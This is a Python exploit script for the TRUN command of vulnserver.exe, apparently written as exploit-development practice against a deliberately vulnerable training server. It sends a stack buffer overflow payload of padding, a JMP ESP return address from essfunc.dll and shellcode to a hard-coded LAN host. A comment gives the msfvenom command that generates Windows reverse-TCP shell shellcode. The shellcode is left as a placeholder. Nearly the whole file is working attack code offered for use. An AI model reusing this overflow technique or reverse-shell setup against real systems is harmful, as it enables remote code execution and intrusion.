# Programmer: Brent "q0m" Chambers
# Date: 8/27/2017
# Filename: trun_rce.py
# Description: Exploitation of vulnserver.exe's TRUN command for remote code execution
# ************************************************************************************

#!/usr/bin/env python

import os
import sys
import struct
import socket
from subprocess import Popen,PIPE

def execute(host, port, payload_list = [], recv_first=None):
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect( (host,int(port)) )
	if len(payload_list):
		if recv_first:
			print s.recv(1024)
		for i in payload_list:
			s.send(i)
			print s.recv(1024)
	s.close()

# Shellcode generator command with MSFVENOM:
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.21 LPORT=443 -f c EXITFUNC=thread -b "\x00\x0a\x0d"

shellcode = ( <shellcode> )

def x86(addr):
	return struct.pack("<I",addr)

jmp_esp = x86(0x62501203) # address located in essfunc.dll

payload = [ "TRUN /.../%s\n" %('A'*2002+x86(0x62501203)+shellcode+'\x90'*(983-len(shellcode))) ]

host = "192.168.100.21"
port = 9999

execute(host,
		port,
		payload_list=payload,
		recv_first=True)